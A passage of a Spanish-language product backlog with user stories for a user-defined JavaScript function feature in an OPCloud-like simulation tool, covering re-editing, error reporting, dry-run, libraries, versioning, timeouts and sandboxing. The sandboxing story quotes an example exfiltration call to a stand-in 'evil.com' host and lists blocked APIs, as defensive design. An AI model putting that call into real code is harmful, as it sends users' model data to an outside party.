- **Dado** que un proceso tiene funcion definida por usuario, **cuando** hago Save del modelo, **entonces** `process.computation.mode = "user_defined"` y `process.computation.body = "<cuerpo>"` se serializan en el JSON del modelo.
- **Dado** que guarde y recargo el modelo, **cuando** se termina de cargar, **entonces** el proceso mantiene el sufijo `` y el cuerpo es identico al guardado.
- **Dado** que exporto el modelo (formato nativo), **cuando** reimporto, **entonces** el cuerpo se preserva sin perdida.

**Reglas y restricciones:**
- El cuerpo se serializa como string literal (no compilado).
- El escape de caracteres especiales (comillas, backslash) debe ser canonico JSON.
- Tamano maximo del cuerpo: **pregunta abierta** (no hay limite observado).

**Modelo de datos tocado:**
- `process.computation.body` — string — persistente en snapshot del modelo.
- `process.computation.mode` — enum — persistente.

**Dependencias:**
- Bloqueada por: HU-B2.005.
- Se integra con: EPICA-30 (Save/Load).

**Integraciones:**
- Serializador del modelo (`src/nucleo/serializacion/`).
- Save/Load.

**Notas de evidencia:**
- Fuente: §6 modelo de datos, §3.2.
- Clase de afirmacion: inferido.

**Prioridad:** S.
**Tamano:** S.
**Etiquetas:** [simulation-user-function, persistencia, serializacion, save].

---

### HU-B2.013 — Reabrir dialogo Function con cuerpo previo precargado

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** U primario; P (lee persistencia) secundario.
**Superficie UI:** dialogo Function.
**Gesto canonico:** seleccionar proceso + Computation → User Defined (segunda vez).

**Historia:**
> Como ingeniero de simulacion, quiero reabrir el dialogo Function y ver el cuerpo que guarde previamente para poder editarlo sin reescribirlo.

**Contexto de negocio:**
La re-edicion es un flujo secundario critico: raramente se escribe una funcion perfecta al primer intento. Precargar el cuerpo previo elimina la friccion. El default `return a+b;` solo debe aparecer en procesos que nunca tuvieron cuerpo definido por usuario.

**Criterios de aceptacion:**
- **Dado** que un proceso tiene `process.computation.body` no vacio, **cuando** vuelvo a seleccionar `User Defined`, **entonces** el textarea muestra exactamente el cuerpo guardado (no el default).
- **Dado** que edito el cuerpo y confirmo, **cuando** `Update` ocurre, **entonces** el cuerpo nuevo reemplaza al previo.
- **Dado** que edito el cuerpo y cancelo (ver HU-B2.017), **cuando** cierro sin `Update`, **entonces** el cuerpo previo permanece intacto.
- **Dado** que el proceso tuvo cuerpo previo y pasa por predefined intermedio, **cuando** vuelvo a User Defined, **entonces** **pregunta abierta** si el cuerpo definido por usuario se preserva o se pierde.

**Reglas y restricciones:**
- La lectura del body es sincrona al abrir el dialogo.
- El draft transitorio (HU-B2.004) se inicializa desde `process.computation.body`.

**Modelo de datos tocado:**
- Lee `process.computation.body`; escribe solo al `Update`.

**Dependencias:**
- Bloqueada por: HU-B2.005, HU-B2.012.

**Integraciones:**
- Dialogo Function.

**Notas de evidencia:**
- Fuente: §3.2 flow secundario.
- Clase de afirmacion: inferido + transcripcionalmente compatible.

**Prioridad:** S.
**Tamano:** S.
**Etiquetas:** [simulation-user-function, ui, re-edicion, persistencia].

---

### HU-B2.014 — Regresar de User Defined a funcion predefinida

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** K (cambio de modo).
**Superficie UI:** submenu Computation.
**Gesto canonico:** clic en otra opcion (`adding`, `subtract`, etc.).

**Historia:**
> Como ingeniero de simulacion, quiero cambiar de `User Defined` a una funcion predefinida cuando descubra que mi calculo es reducible a la biblioteca estandar, sin perder la opcion de volver al cuerpo definido por usuario mas tarde.

**Contexto de negocio:**
Es un flujo de simplificacion: el modelador empieza con codigo propio, luego se da cuenta que una funcion predefinida basta. El comportamiento ideal es que el cuerpo definido por usuario se conserve (archivado), pero OPCloud **no deja evidencia** de este comportamiento. La HU queda marcada como requires-clarification para definir la politica.

**Criterios de aceptacion:**
- **Dado** que un proceso tiene `user_defined` con cuerpo `<body>`, **cuando** selecciono `adding` en Computation, **entonces** el proceso pasa a `mode = "predefined"`, `predefinedName = "adding"`.
- **Dado** que regrese de definida por usuario a predefined, **cuando** vuelvo a definida por usuario, **entonces** **abierto**: ¿recupero `<body>` o recibo el default `return a+b;`?
- **Dado** que cambio de modo, **cuando** ocurre el cambio, **entonces** el sufijo `` se mantiene (marca generica de proceso computable).

**Reglas y restricciones:**
- Politica de preservacion del cuerpo es **pregunta abierta** (§11 doc fuente).
- Recomendacion: preservar el cuerpo en `process.computation.body` aunque `mode` no sea `user_defined`, para permitir recuperacion reversible.

**Modelo de datos tocado:**
- `process.computation.mode` — enum — persistente.
- `process.computation.predefinedName` — string — persistente.
- `process.computation.body` — string — persistente (politica pendiente).

**Dependencias:**
- Bloqueada por: HU-B2.001.
- Requiere: decision de politica (pregunta abierta §11).

**Integraciones:**
- EPICA-B1 (predefinidas).

**Notas de evidencia:**
- Fuente: §3.3, §11 preguntas abiertas.
- Clase de afirmacion: hipotesis + abierto.
- Etiqueta: `requires-clarification`.

**Prioridad:** C.
**Tamano:** S.
**Etiquetas:** [simulation-user-function, ui, cambio-modo, requires-clarification].

---

### HU-B2.015 — Reportar error de sintaxis en cuerpo de funcion

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** K (validacion) + U (feedback).
**Superficie UI:** dialogo Function + panel de errores.
**Gesto canonico:** automatico al `Update` o al Execute.

**Historia:**
> Como ingeniero de simulacion, quiero que el sistema me reporte un error de sintaxis en mi cuerpo (typo de `retrun`, parentesis desbalanceados) antes de ejecutar para corregirlo sin adivinar la causa.

**Contexto de negocio:**
En Advance 4 el editor no colorea ni subraya errores. El typo `retrun` en lugar de `return` probablemente falla silenciosamente o con mensaje criptico. Un reporte explicito es critico para adoptabilidad. Advance 7 evoluciona a IDE con feedback — esta HU formaliza el minimo viable.

**Criterios de aceptacion:**
- **Dado** que escribo `retrun a+b;` en el textarea, **cuando** intento `Update`, **entonces** aparece un mensaje inline (toast, banner, marca en textarea) que indica "syntax error: Unexpected identifier 'retrun'".
- **Dado** que el cuerpo tiene parentesis desbalanceados, **cuando** intento `Update`, **entonces** el error se reporta indicando linea y columna si es posible.
- **Dado** que hay error de sintaxis, **cuando** intento `Execute`, **entonces** la ejecucion se aborta y el mensaje de error se muestra.
- **Dado** que corrijo el error, **cuando** vuelvo a `Update`, **entonces** la persistencia procede sin alerta.

**Reglas y restricciones:**
- Validacion sintactica ocurre al commit o al run, no keystroke-por-keystroke en esta version minima.
- El mensaje debe incluir linea y columna cuando el parser JS los provea.
- Politica: permitir `Update` con body sintacticamente invalido es **abierto** (bloquear es mas seguro; permitir es mas permisivo).

**Modelo de datos tocado:**
- `ui.functionDialog.lastError` — `{message, line, column}` nullable — transitorio.

**Dependencias:**
- Bloqueada por: HU-B2.004, HU-B2.005.

**Integraciones:**
- Parser JS (p.ej. uso de `Function()` constructor o parser estandar).
- Panel/banner de errores.

**Notas de evidencia:**
- Fuente: §4 flows de error, §11 preguntas abiertas.
- Clase de afirmacion: abierto.
- Etiqueta: `requires-clarification`.

**Prioridad:** S.
**Tamano:** M.
**Etiquetas:** [simulation-user-function, validacion, error-reporting, sintaxis, requires-clarification].

---

### HU-B2.016 — Reportar error de runtime (alias indefinido, div/0)

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** K (runtime) + U (feedback).
**Superficie UI:** banner de error en canvas / panel de errores.
**Gesto canonico:** automatico al Execute.

**Historia:**
> Como ingeniero de simulacion, quiero que los errores de runtime (`p3.x` no existe, division por cero, `NaN`) se reporten con mensaje claro en lugar de dejar casillas en estado inconsistente.

**Contexto de negocio:**
Advance 4 no muestra como se reporta un runtime error. Un silencio aparente (`undefined` escrito en la casilla) corrompe la confianza. El reporte explicito convierte al modelador en herramienta confiable: los errores son informacion, no ruido.

**Criterios de aceptacion:**
- **Dado** que el cuerpo contiene `return p3.x;` pero no existe cosa con alias `p3`, **cuando** ejecuto, **entonces** se reporta `runtime error: alias 'p3' is not defined`.
- **Dado** que `p2.x == p1.x` y el cuerpo divide por `(p2.x-p1.x)`, **cuando** ejecuto, **entonces** el resultado se evalua a `Infinity` o `NaN` y se reporta con warning explicito (no se persiste silenciosamente en la casilla).
- **Dado** que se produjo error de runtime, **cuando** miro la casilla resultado, **entonces** no se sobrescribe su valor anterior (o se marca con indicador visual de error).
- **Dado** que corrijo el error (agrego `p3` o cambio valor de `p2.x`), **cuando** reejecuto, **entonces** la casilla se actualiza normalmente.

**Reglas y restricciones:**
- `NaN`, `Infinity` se tratan como errores de runtime salvo configuracion explicita.
- Alias indefinido es siempre error.
- El mensaje debe ser accionable (indicar que alias, que operacion fallo).

**Modelo de datos tocado:**
- `process.computation.lastRunError` — `{message, timestamp}` nullable — transitorio (puede persistirse para debug).

**Dependencias:**
- Bloqueada por: HU-B2.011.

**Integraciones:**
- Motor de ejecucion (EPICA-B0/B1).
- Panel de errores.

**Notas de evidencia:**
- Fuente: §4 flows de error, §11 preguntas abiertas.
- Clase de afirmacion: abierto.
- Etiqueta: `requires-clarification`.

**Prioridad:** S.
**Tamano:** M.
**Etiquetas:** [simulation-user-function, validacion, error-reporting, runtime, requires-clarification].

---

### HU-B2.017 — Cancelar edicion del dialogo Function sin persistir

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** U.
**Superficie UI:** dialogo Function (boton `x` o clic fuera).
**Gesto canonico:** clic en boton de cerrar del dialogo (o ESC).

**Historia:**
> Como ingeniero de simulacion, quiero descartar cambios del editor con un gesto explicito de cancelacion para no comprometer el modelo con borradores experimentales.

**Contexto de negocio:**
El dialogo muestra unicamente `Update`; no hay `Cancel` observado. La politica de cierre-sin-guardar es ambigua. Esta HU formaliza la expectativa: cerrar con `x` o ESC descarta el draft, y el cuerpo persistido permanece intocado. Una confirmacion de descarte cuando el draft tiene cambios es best practice.

**Criterios de aceptacion:**
- **Dado** que tengo el dialogo abierto con cambios no guardados, **cuando** presiono ESC o hago clic en el boton `x`, **entonces** el dialogo se cierra sin modificar `process.computation.body`.
- **Dado** que el draft difiere del body persistido, **cuando** intento cerrar, **entonces** aparece confirmacion `Discard unsaved changes? [Discard] [Cancel]`.
- **Dado** que el draft es igual al body persistido, **cuando** cierro, **entonces** se cierra sin confirmacion.

**Reglas y restricciones:**
- ESC y `x` son equivalentes.
- Clic fuera del dialogo **no** cierra — por ser modeless, esa regla romperia la interaccion con el canvas.
- La confirmacion de descarte es opcional pero recomendada para prevenir perdida accidental.

**Modelo de datos tocado:**
- `ui.functionDialog.draft` — descartado.
- `process.computation.body` — intacto.

**Dependencias:**
- Bloqueada por: HU-B2.002, HU-B2.004.

**Integraciones:**
- Dialogo Function.

**Notas de evidencia:**
- Fuente: §4, §11 preguntas abiertas.
- Clase de afirmacion: hipotesis.
- Etiqueta: `requires-clarification`.

**Prioridad:** C.
**Tamano:** XS.
**Etiquetas:** [simulation-user-function, ui, cancelar, requires-clarification].

---

### HU-B2.018 — Probar funcion con dry-run sin modificar casillas reales

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** X (runtime alternativo).
**Superficie UI:** boton `Test` o `Dry Run` en dialogo Function + panel de resultado.
**Gesto canonico:** clic en `Test` tras escribir cuerpo.

**Historia:**
> Como ingeniero de simulacion, quiero probar mi funcion con valores actuales sin alterar las casillas del modelo para verificar que produce el resultado esperado antes de hacer el commit.

**Contexto de negocio:**
Sin dry-run, cada prueba ensucia el modelo: las casillas se sobrescriben, las cascadas se disparan, revertir requiere undo. Dry-run aisla la ejecucion en un sandbox de valores y muestra el retorno sin efectos colaterales. Es estandar en todo editor de formulas serio.

**Criterios de aceptacion:**
- **Dado** que tengo cuerpo en el textarea y el proceso tiene instrumentos con valores, **cuando** hago clic en `Test`, **entonces** la funcion se evalua con los valores actuales y el retorno se muestra en un panel lateral del dialogo SIN escribir en la casilla resultado.
- **Dado** que el dry-run tiene error, **cuando** se evalua, **entonces** el error aparece en el mismo panel sin bloquear el textarea.
- **Dado** que el dry-run muestra un valor, **cuando** hago clic en `Apply` (opcional), **entonces** el retorno si se escribe en la casilla.
- **Dado** que dry-run es exitoso, **cuando** hago clic en `Update`, **entonces** se persiste el cuerpo (sin escribir casilla — Apply y Update son independientes).

**Reglas y restricciones:**
- Dry-run no persiste cambios al modelo.
- Dry-run puede mostrar valores intermedios de alias evaluados (p.ej. `p1.x=1, p2.y=19, result=3`).
- Es una extension aspiracional — no observada en Advance 4.

**Modelo de datos tocado:**
- `ui.functionDialog.lastDryRun` — `{result, aliases, error}` — transitorio.

**Dependencias:**
- Bloqueada por: HU-B2.004, HU-B2.009.

**Integraciones:**
- Runtime (sandboxed).
- Panel de resultado.

**Notas de evidencia:**
- Fuente: inferido del §4 (error flows) + §7 integraciones.
- Clase de afirmacion: hipotesis (extension aspiracional).
- Etiqueta: `requires-clarification`.

**Prioridad:** S.
**Tamano:** M.
**Etiquetas:** [simulation-user-function, testing, dry-run, sandboxing, requires-clarification].

---

### HU-B2.019 — Ejecutar paso a paso con debug de valores de alias

**Actor primario:** IS.
**Actores secundarios:** ME.
**Tipo:** opcloud-ui.
**Nivel categorico:** X (runtime con breakpoints).
**Superficie UI:** boton `play-∆` (step-run) + panel de valores.
**Gesto canonico:** clic en boton play-con-delta.

**Historia:**
> Como ingeniero de simulacion, quiero ejecutar mi funcion paso a paso para observar los valores de alias y variables intermedias y localizar errores sin prints manuales.

**Contexto de negocio:**
El icono `play-con-delta` de la barra de simulacion sugiere un modo step-run. Su funcion exacta es **pregunta abierta** en Advance 4. Esta HU formaliza la expectativa minima: debugging paso-a-paso con inspeccion de valores de alias.

**Criterios de aceptacion:**
- **Dado** que tengo cuerpo y proceso computable, **cuando** hago clic en `play-∆`, **entonces** la funcion se evalua y se muestra un panel con valores de todos los alias accesibles (`p1.x=1, p1.y=7, p2.x=5, p2.y=19`).
- **Dado** que el cuerpo tiene multiples expresiones intermedias (`const a = p2.y - p1.y; const b = p2.x - p1.x; return a/b;`), **cuando** ejecuto step, **entonces** puedo avanzar linea-por-linea y ver valores de `a`, `b` en cada paso.
- **Dado** que hay un error en un paso, **cuando** lo alcanzo, **entonces** se detiene con el mensaje de error en esa linea.

**Reglas y restricciones:**
- Debug requiere parser con soporte de pausado (p.ej. AST-walking interpreter).
- Impacto en performance: step-run no debe bloquear el canvas.

**Modelo de datos tocado:**
- `ui.debugger.state` — `{currentLine, variables, breakpoints}` — transitorio.

**Dependencias:**
- Bloqueada por: HU-B2.011.

**Integraciones:**
- Runtime extendido.
- Panel de debug.

**Notas de evidencia:**
- Fuente: §5.2 (icono play-∆ abierto), §11 preguntas abiertas.
- Clase de afirmacion: hipotesis (extension aspiracional).
- Etiqueta: `requires-clarification`.

**Prioridad:** C.
**Tamano:** M.
**Etiquetas:** [simulation-user-function, debug, paso-a-paso, requires-clarification].

---

### HU-B2.020 — Organizar funciones reutilizables en biblioteca organizacional

**Actor primario:** AO (admin de organizacion).
**Actores secundarios:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** C (config organizacional) + X (persistencia cross-modelo).
**Superficie UI:** panel admin — `Function Library` por organizacion.
**Gesto canonico:** crear, renombrar, archivar funciones desde panel admin.

**Historia:**
> Como admin de organizacion, quiero mantener una biblioteca de funciones reutilizables a nivel organizacional para que los modeladores no reinventen calculos comunes y preserven consistencia semantica.

**Contexto de negocio:**
Una organizacion con muchos modelos comparte patrones de calculo (p.ej. `slope(p1, p2)`, `distance(p1, p2)`, unidades SI). Una biblioteca central permite estandarizar. La analogia natural es la paleta de estereotipos organizacionales (`a0`), extendida a funciones.

**Criterios de aceptacion:**
- **Dado** que soy admin, **cuando** accedo al panel `Function Library`, **entonces** puedo crear, editar, archivar y borrar funciones a nivel organizacional.
- **Dado** que creo una funcion `slope(p1, p2)`, **cuando** la guardo, **entonces** queda disponible para todos los modeladores de la organizacion.
- **Dado** que un modelador usa una funcion de la biblioteca, **cuando** yo la actualizo, **entonces** **pregunta abierta**: ¿se propaga el cambio? ¿O se congela la version usada?
- **Dado** que archivo una funcion, **cuando** un modelador intenta importarla, **entonces** no aparece en el picker salvo que habilite "mostrar archivadas".

**Reglas y restricciones:**
- Scope: `organizational` (analogo a stereotypes organizacionales vs globales).
- Cada funcion tiene nombre, firma (parametros), cuerpo, descripcion opcional.
- Permisos: solo AO puede editar la biblioteca; IS solo consume.

**Modelo de datos tocado:**
- `organization.functionLibrary[]` — array de `{id, name, signature, body, description, version, status}` — persistente.

**Dependencias:**
- Relacionada con: EPICA-82 (organization ontology), EPICA-33 (templates).
- Bloqueada por: decision de arquitectura multi-modelo.

**Integraciones:**
- Panel de admin.
- Picker en dialogo Function.

**Notas de evidencia:**
- Fuente: inferido del patron de `<<Point>>` organizacional (§3.1 paso 4).
- Transcripcion: "this is an organizational stereotype … without a g which is only organizational stereotype" — sugiere el mismo patron para funciones.
- Clase de afirmacion: hipotesis (extension aspiracional).
- Etiqueta: `requires-clarification`.

**Prioridad:** C.
**Tamano:** L.
**Etiquetas:** [simulation-user-function, biblioteca, organizacion, permisos, requires-clarification].

---

### HU-B2.021 — Importar funcion desde biblioteca organizacional a un proceso

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** U + K.
**Superficie UI:** dialogo Function — picker `Import from Library`.
**Gesto canonico:** clic en `Import` + seleccion de funcion + confirmacion.

**Historia:**
> Como ingeniero de simulacion, quiero importar una funcion de la biblioteca organizacional a mi proceso para reusar calculos validados sin reescribirlos.

**Contexto de negocio:**
El flujo de importacion es el consumo natural de la biblioteca (HU-B2.020). El picker muestra las funciones disponibles, y al seleccionar una, el cuerpo se copia en el textarea local del proceso (opcional: con referencia viva para propagar cambios).

**Criterios de aceptacion:**
- **Dado** que tengo el dialogo Function abierto, **cuando** hago clic en `Import from Library`, **entonces** se muestra un picker con las funciones de la biblioteca organizacional.
- **Dado** que selecciono `slope`, **cuando** confirmo, **entonces** el textarea se puebla con el cuerpo de `slope` y el proceso queda marcado como `uses_library_function = "slope"`.
- **Dado** que importe una funcion, **cuando** la biblioteca se actualiza, **entonces** **pregunta abierta**: ¿propagacion automatica o explicita (pin version)?
- **Dado** que modifico localmente el cuerpo importado, **cuando** guardo, **entonces** se crea un fork local (pierde vinculacion con biblioteca).

**Reglas y restricciones:**
- Politica de propagacion de cambios es pregunta abierta (HU-B2.020).
- El picker debe filtrar por compatibilidad (aridad, tipos de retorno) si se declaran firmas formales.

**Modelo de datos tocado:**
- `process.computation.body` — string — persistente.
- `process.computation.librarySource` — `{libraryId, functionId, version}` nullable — persistente.

**Dependencias:**
- Bloqueada por: HU-B2.020.

**Integraciones:**
- Biblioteca organizacional.
- Dialogo Function.

**Notas de evidencia:**
- Fuente: inferido.
- Clase de afirmacion: hipotesis.
- Etiqueta: `requires-clarification`.

**Prioridad:** C.
**Tamano:** M.
**Etiquetas:** [simulation-user-function, biblioteca, import, requires-clarification].

---

### HU-B2.022 — Exportar funcion del proceso a biblioteca organizacional

**Actor primario:** AO.
**Actores secundarios:** IS (propone).
**Tipo:** opcloud-ui.
**Nivel categorico:** C.
**Superficie UI:** dialogo Function — boton `Export to Library`.
**Gesto canonico:** clic en `Export` + dialogo de nombre + confirmacion.

**Historia:**
> Como admin, quiero promover una funcion local a la biblioteca organizacional para que otros modeladores puedan reusarla.

**Contexto de negocio:**
Path de arriba hacia abajo: un modelador experto escribe una funcion util; el admin la promueve para el resto. Requiere permisos del admin para evitar contaminacion de la biblioteca.

**Criterios de aceptacion:**
- **Dado** que soy AO y tengo un proceso con funcion definida por usuario util, **cuando** hago clic en `Export to Library`, **entonces** se abre un dialogo solicitando nombre, descripcion y parametros de la funcion exportada.
- **Dado** que confirmo el export, **cuando** se guarda, **entonces** la funcion aparece en la biblioteca y esta disponible para import en otros modelos.
- **Dado** que no soy AO, **cuando** intento `Export`, **entonces** el boton no esta visible o esta deshabilitado.

**Reglas y restricciones:**
- Permisos estrictos: solo AO.
- La funcion exportada debe pasar validacion de biblioteca (p.ej. no usar alias especificos del modelo origen — debe parametrizarse).

**Modelo de datos tocado:**
- `organization.functionLibrary[]` — append.

**Dependencias:**
- Bloqueada por: HU-B2.020.

**Integraciones:**
- Panel de permisos.
- Biblioteca organizacional.

**Notas de evidencia:**
- Fuente: inferido.
- Clase de afirmacion: hipotesis.
- Etiqueta: `requires-clarification`.

**Prioridad:** C.
**Tamano:** S.
**Etiquetas:** [simulation-user-function, biblioteca, export, permisos, requires-clarification].

---

### HU-B2.023 — Versionar cuerpo de funcion con historial minimo

**Actor primario:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** P.
**Superficie UI:** dialogo Function — boton `History` + lista de versiones.
**Gesto canonico:** clic en `History` + seleccion de version + restaurar.

**Historia:**
> Como ingeniero de simulacion, quiero ver el historial de cambios de mi cuerpo de funcion y restaurar una version anterior para recuperar de errores sin tener que recordar el codigo previo.

**Contexto de negocio:**
El cuerpo es codigo; el codigo se regresiona. Un historial incluso minimo (ultimas N versiones) es salvavidas. El ciclo de vida del code-as-data debe heredar las virtudes del control de versiones.

**Criterios de aceptacion:**
- **Dado** que edito y guardo varias versiones, **cuando** abro `History`, **entonces** veo la lista de versiones con timestamp y primera linea de cambio.
- **Dado** que selecciono una version previa, **cuando** confirmo `Restore`, **entonces** el textarea se puebla con ese cuerpo y al `Update` queda persistido como nueva version.
- **Dado** que el historial excede N (p.ej. 20), **cuando** agrego nueva version, **entonces** la mas antigua se descarta (FIFO) o se archiva.

**Reglas y restricciones:**
- Historial minimo: ultimas 10 versiones (configurable).
- Timestamp + autor (si hay colaboracion).
- Diff visual entre versiones es **extension aspiracional**.

**Modelo de datos tocado:**
- `process.computation.history[]` — array de `{body, timestamp, author}` — persistente (con cap).

**Dependencias:**
- Bloqueada por: HU-B2.005.

**Integraciones:**
- Dialogo Function.
- Posible con EPICA-40 (colaboracion) para autor.

**Notas de evidencia:**
- Fuente: inferido.
- Clase de afirmacion: hipotesis.
- Etiqueta: `requires-clarification`.

**Prioridad:** C.
**Tamano:** M.
**Etiquetas:** [simulation-user-function, versionado, historial, requires-clarification].

---

### HU-B2.024 — Limitar tiempo de ejecucion con timeout configurable

**Actor primario:** AO.
**Actores secundarios:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** C + X.
**Superficie UI:** config de organizacion — `Execution Timeout`.
**Gesto canonico:** definir timeout en settings admin.

**Historia:**
> Como admin, quiero configurar un timeout maximo para la ejecucion de funciones definidas por usuario para evitar que un bucle infinito o codigo pesado congele la experiencia del modelador.

**Contexto de negocio:**
Codigo arbitrario puede colgarse (loop infinito, computo pesado). Un timeout protege la UI. Debe ser configurable porque la tolerancia depende del contexto: tiempo-real exige <100ms; analisis offline tolera segundos.

**Criterios de aceptacion:**
- **Dado** que soy AO, **cuando** accedo a settings de ejecucion, **entonces** puedo configurar `executionTimeoutMs` con valor por default (p.ej. 1000).
- **Dado** que un modelador ejecuta funcion y excede el timeout, **cuando** se alcanza, **entonces** la ejecucion se aborta y se reporta `runtime error: execution exceeded timeout of Nms`.
- **Dado** que ejecuto una funcion rapida (<timeout), **cuando** termina, **entonces** no hay mensaje de timeout.

**Reglas y restricciones:**
- Timeout default: 1000ms (a calibrar).
- Rango permitido: 100–60000ms (1min max).
- Aplicable a Sync; para Async el timeout por run es distinto (pregunta abierta).

**Modelo de datos tocado:**
- `organization.settings.executionTimeoutMs` — number — persistente.

**Dependencias:**
- Bloqueada por: HU-B2.011.

**Integraciones:**
- Panel de settings.
- Runtime (setTimeout / Web Worker con terminacion forzada).

**Notas de evidencia:**
- Fuente: inferido del §4 (flows error) + §11.
- Clase de afirmacion: hipotesis.
- Etiqueta: `requires-clarification`.

**Prioridad:** S.
**Tamano:** S.
**Etiquetas:** [simulation-user-function, sandboxing, timeout, settings, requires-clarification].

---

### HU-B2.025 — Sandboxar ejecucion sin acceso a red ni a DOM

**Actor primario:** AO.
**Actores secundarios:** IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** C + X (seguridad).
**Superficie UI:** ninguna (invariante del runtime).
**Gesto canonico:** ninguno.

**Historia:**
> Como admin, quiero que las funciones definidas por usuario se ejecuten en un sandbox sin acceso a red, DOM, localStorage ni filesystem para prevenir exfiltracion de datos o inyeccion de comportamiento no autorizado.

**Contexto de negocio:**
Permitir codigo arbitrario es un vector de ataque. Un usuario malicioso podria escribir `fetch('http://evil.com/?data=' + JSON.stringify(model))` dentro del cuerpo. El sandbox reduce el ataque a solo matematicas y acceso a los alias. Es invariante de seguridad no negociable si el modelador se multi-usuariza.

**Criterios de aceptacion:**
- **Dado** que un cuerpo contiene `fetch('...')`, **cuando** se evalua, **entonces** lanza ReferenceError (`fetch is not defined`).
- **Dado** que un cuerpo contiene `window.alert(...)` o accede a `document`, **cuando** se evalua, **entonces** lanza ReferenceError.
- **Dado** que un cuerpo usa solo operadores matematicos y referencias a alias, **cuando** se evalua, **entonces** ejecuta normalmente.
- **Dado** que el cuerpo usa funciones matematicas estandar (`Math.sqrt`, `Math.sin`), **cuando** se evalua, **entonces** se permite (whitelist de Math).

**Reglas y restricciones:**
- Sandboxing implementable via Web Worker + Function constructor con scope restringido.
- Whitelist minima: `Math.*`, `Number`, `String`, `Array`, `Object` (seguros).
- Blacklist: `fetch`, `XMLHttpRequest`, `window`, `document`, `localStorage`, `indexedDB`, `eval`, `Function`.

**Modelo de datos tocado:**
- Ninguno (es invariante del runtime).

**Dependencias:**
- Bloqueada por: HU-B2.011.
- Conexion con: HU-B2.024 (timeout sobre mismo sandbox).

**Integraciones:**
- Runtime (Web Worker aislado o `Function()` con scope cuidadoso).

**Notas de evidencia:**
- Fuente: no observado en el corpus.
- Clase de afirmacion: hipotesis (extension aspiracional de seguridad).
- Etiqueta: `requires-clarification`.

**Prioridad:** M1 (critica si hay multi-usuario / produccion).
**Tamano:** L.
**Etiquetas:** [simulation-user-function, sandboxing, seguridad, runtime, requires-clarification].

---

### HU-B2.026 — Cargar pack de ejemplos de funciones canonicas OPM

**Actor primario:** PD (facilitador pedagogico).
**Actores secundarios:** MN, IS.
**Tipo:** opcloud-ui.
**Nivel categorico:** C + D (dominio pedagogico).
**Superficie UI:** dialogo Function — boton `Load Example`.
**Gesto canonico:** clic en `Load Example` + seleccion de ejemplo.

**Historia:**
> Como facilitador pedagogico, quiero ofrecer un pack de ejemplos canonicos (slope, distance, area, mean, max) para que los modeladores novatos aprendan el contrato alias-codigo por imitacion sin partir de la hoja en blanco.

**Contexto de negocio:**
La hoja en blanco es el mayor enemigo pedagogico. Un pack curado de funciones tipicas (geometria, estadistica, unidades) inyecta patrones correctos. Es el equivalente didactico a los "snippets" en un IDE.

**Criterios de aceptacion:**
- **Dado** que abro el dialogo Function, **cuando** hago clic en `Load Example`, **entonces** aparece un picker con ejemplos categorizados (Geometry, Statistics, Units).
- **Dado** que selecciono `slope(p1, p2)`, **cuando** confirmo, **entonces** el textarea se puebla con `return (p2.y - p1.y) / (p2.x - p1.x);` y aparece un comentario guia con los alias esperados.
- **Dado** que el proceso no tiene alias compatibles con el ejemplo, **cuando** intento cargar, **entonces** aparece advertencia indicando que alias faltan.

**Reglas y restricciones:**
- Ejemplos son estaticos (bundled con el producto); no son la biblioteca organizacional (HU-B2.020).
- Cada ejemplo incluye: nombre, cuerpo, comentario con alias esperados, link a documentacion.

**Modelo de datos tocado:**
- `process.computation.body` — string — persistente (tras load).
- Ejemplos son datos estaticos: `examplesCatalog[]` — no mutable desde UI.

**Dependencias:**
- Bloqueada por: HU-B2.004.

**Integraciones:**
- Dialogo Function.
- EPICA-91 (tutorial) — puede enlazar ejemplos al tour.

**Notas de evidencia:**
- Fuente: inferido (alinea con la inclinacion pedagogica OPM).
- Clase de afirmacion: hipotesis.
- Etiqueta: `requires-clarification`.

**Prioridad:** C.
**Tamano:** S.
**Etiquetas:** [simulation-user-function, pedagogico, ejemplos, pack, requires-clarification].

---

## Preguntas abiertas derivadas (trazabilidad con §11 doc fuente)

- **QB2.1**: ¿Que ocurre con el cuerpo definido por usuario al cambiar el proceso a funcion predefinida? ¿Se pierde, archiva, sobrescribe? Impacta HU-B2.014, HU-B2.023. Estado: abierto.
- **QB2.2**: ¿El dialogo Function tiene boton Cancel explicito? ¿Hay autosave mientras se escribe? Impacta HU-B2.017. Estado: hipotesis.
- **QB2.3**: ¿Que API adicional hay disponible dentro del cuerpo ademas de alias? En Advance 7 se mencionan APIs auto-generadas y `user_input`. Impacta HU-B2.009. Estado: abierto.
- **QB2.4**: ¿Como se reporta error de sintaxis y runtime? No observado. Impacta HU-B2.015, HU-B2.016. Estado: abierto.
- **QB2.5**: ¿Los parentesis `` pueden tener contenido (firma formal `(p1, p2)`)? Sugerido por la notacion. Impacta HU-B2.006. Estado: abierto.
- **QB2.6**: ¿El icono `play-con-delta` es step-run, incremental, o resume? Impacta HU-B2.019. Estado: abierto.
- **QB2.7**: ¿Headless Runner desactiva solo animacion o tambien repintado de casillas? Impacta HU-B2.011 (no cubierto en detalle aqui, ver EPICA-B1). Estado: abierto.
- **QB2.8**: ¿Import XLSX permite mapeo explicito columna-atributo o asume nombres? Impacta HU-B2.011 (ver EPICA-71). Estado: abierto.
- **QB2.9**: ¿La funcion puede invocar otras funciones definidas por usuario de otros procesos? No observado. Impacta HU-B2.020/021. Estado: abierto.
- **QB2.10**: ¿El alias permite espacios o solo identificadores JS-validos? Impacta HU-B2.008. Estado: abierto.
- **QB2.11**: ¿Propagacion de cambios en biblioteca organizacional es automatica o pin version? Impacta HU-B2.021. Estado: abierto.
- **QB2.12**: ¿Tamano maximo del cuerpo persistible? Impacta HU-B2.012. Estado: abierto.

## Referencias cruzadas

- Doc fuente: `opcloud-reverse/b2-simulation-user-functions.md`.
- Fuente normativa: `opm-iso-19450-es.md`, `opm-visual-es.md`, `opm-opl-es.md` (aplica parcialmente: la capa de simulacion con codigo definido por usuario no esta en la SSOT OPM).
